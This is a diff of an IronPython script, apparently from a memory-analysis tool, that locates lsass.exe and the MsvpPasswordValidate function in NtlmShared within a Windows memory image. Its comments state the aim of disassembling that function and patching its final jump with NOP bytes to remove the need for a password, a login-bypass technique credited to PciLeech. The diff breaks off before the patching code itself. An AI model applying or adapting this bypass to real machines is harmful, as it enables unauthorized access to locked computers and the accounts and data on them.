@@ -24,31 +24,27 @@ import Analyze
 PtrToStructure = Marshal.PtrToStructure.Overloads[IntPtr, Type]
 NopArr = Array[Byte]([ 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 ])
 
+#vtero = QuickSetup("C:\\Users\\files\\VMs\\Windows 10 x64-PRO-1703\\Windows 10 x64-PRO-1703-40599dd1.vmem")
+#logicalList = vtero.WalkProcList(vtero.KernelProc)
+#vtero.MemAccess.MapViewSize = 128 * 1024
+#vtero.KernelProc.InitSymbolsForVad()
+#p = GetProc(vtero, "lsass.exe")
+
 # Find lsass.exe and ntlmshared.dll and MsvpPasswordValidate
 # Dissassemble to find the final jne and nop it out ;)
 # this removes the requirement to use a password (unlock from PciLeech :) Thanks @UlfFrisk
-def UnLock(vtero):
-	p = None
-	procs = vtero.Processes.ToArray()
-	for proc in procs:
-		if proc.OSPath is not None and proc.OSPath.Contains("lsass.exe"):
-			p = proc
-
-
-	p.MemAccess = vtero.MemAccess
-	p.MergeVAMetaData()
-	p.CopySymbolsForVad(vtero.KernelProc)
-	for s in p.Sections.Values:
-		print s.Name + " ",
-		if s.VadFile is not None:
-			print s.VadFile + " entry: ",
-			print s.VadAddr.ToString("x") + " + ",
-			if s.Module is not None:
-				print s.Module.EntryPoint.ToString("X"),
-		print " "
-
-
-	#TODO: case insensitive
+def UnLock(vtero, p):
+    p.MergeVAMetaData()
+    for s in p.Sections.Values:
+        print s.Name + " ",
+        if s.VadFile is not None:
+            print s.VadFile + " entry: ",
+            print s.VadAddr.ToString("x") + " + ",
+        if s.Module is not None:
+            print s.Module.EntryPoint.ToString("X"),
+        print " "
+	
+    #TODO: case insensitive
 	syms = p.MatchSymbols("MsvpPasswordValidate", "NtlmShared")
 	EntryPoint = syms[0].Item2
 	Length = syms[0].Item3
